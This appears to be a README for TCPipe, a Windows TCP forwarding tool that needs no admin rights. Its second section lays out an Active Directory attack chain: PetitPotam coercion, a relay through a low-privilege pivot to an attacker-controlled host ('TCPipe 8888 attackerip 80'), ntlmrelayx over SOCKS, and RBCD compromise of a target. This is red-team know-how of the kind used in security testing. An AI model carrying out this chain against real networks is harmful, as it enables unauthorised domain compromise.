# TCPipe

**TCPipe** is a lightweight, portable TCP forwarding tool for Windows. It allows bidirectional traffic proxying **without requiring administrator privileges** and works seamlessly with browsers, command-line clients, and other TCP-based applications.

## Features

- Forward TCP traffic from a local port to any remote host and port  
- Supports multiple simultaneous clients  
- Fully bidirectional: client ↔ server streaming  
- Works with HTTP, HTTPS, and other TCP protocols  
- No admin rights required — runs as a standard user  
- Single executable — easy to deploy

## Usage

```cmd
TCPipe.exe <localPort> <remoteHost> <remotePort>
```

## Example
Forward traffic on localhost 2222 to remote server on 80 **without Administrative permissions**

```cmd
TCPipe.exe 2222 192.168.122.113 80
```

# AD Attack(s)

This attack chain demonstrates a sophisticated NTLM relay technique designed for scenarios where the attacker only has remote access via SOCKS proxy with no direct internal machine access or administrative privileges within the broadcast domain.

**Core Challenge:** As an external attacker with only SOCKS proxy access to a low-privileged compromise, we cannot run traditional relay tools directly on internal networks.

**Solution:** We leverage the compromised low-privilege host (HOSTA) as both a SOCKS proxy and TCP pivot to redirect authentication attempts from valuable targets (HOSTB) through our external attack infrastructure.

**Key Advantages:**

* No internal attack machine required - entire relay chain operates through SOCKS.
* No admin rights needed on pivot host.
* Bypasses network segmentation from external position.

The diagram visualizes how we weaponize SOCKS proxy access into a full NTLM relay chain, achieving RBCD compromise without ever having direct internal machine access.

### Host Definitions

| Host | Role | Access Level |
|------|------|-------------|
| **HOSTB** | WebDAV enabled target | No access yet (just domain user auth) |
| **HOSTA** | Pivot host | Low priv access (via RDP/user compromise) |
| **ATTACKER** | Attack platform | Root/owned (public IP) |

### Flow

**Prerequisites**
1. HOSTA -> Reverse SOCKS connection to ATTACKER.
2. Attacker -> sent relay package received back to HOSTA network, through HOSTA NIC. 

```mermaid
graph TD
    %% Attack flow
    A[PetitPotam Trigger] --> B[HOSTB<br/>WebDAV Enabled<br/>Domain User Auth]
    B --> C[HOSTA:8888<br/>Low Priv Access<br/>TCPipe 8888 attackerip 80]
    C --> D[TCP Forwarder<br/>Port 8888]
    D --> E[publicattckerip:80<br/>Root Owned VM<br/>ntlmrelayx.py listener]
    E --> F[ntlmrelayx<br/>Relay Service<br/>over SOCKS]
    F --> G[Domain Controller<br/>LDAP/LDAPS]
    G --> H[RBCD Compromise<br/>on HOSTB]

    %% Styling definitions
    classDef target fill:#ffcccc,stroke:#ff0000,stroke-width:2px,color:#000;
    classDef pivot fill:#ccffcc,stroke:#00ff00,stroke-width:2px,color:#000;
    classDef attacker fill:#ccccff,stroke:#0000ff,stroke-width:2px,color:#000;
    classDef success fill:#ffffcc,stroke:#ffcc00,stroke-width:3px,color:#000;

    %% Apply styling
    class B target;
    class C pivot;
    class E,F attacker;
    class H success;

    %% Phase groupings
    subgraph Phase1 [Phase 1: Initial Trigger]
        A
        B
    end

    subgraph Phase2 [Phase 2: TCP Pivot]
        C
        D
    end

    subgraph Phase3 [Phase 3: Relay & Attack]
        E
        F
        G
        H
    end
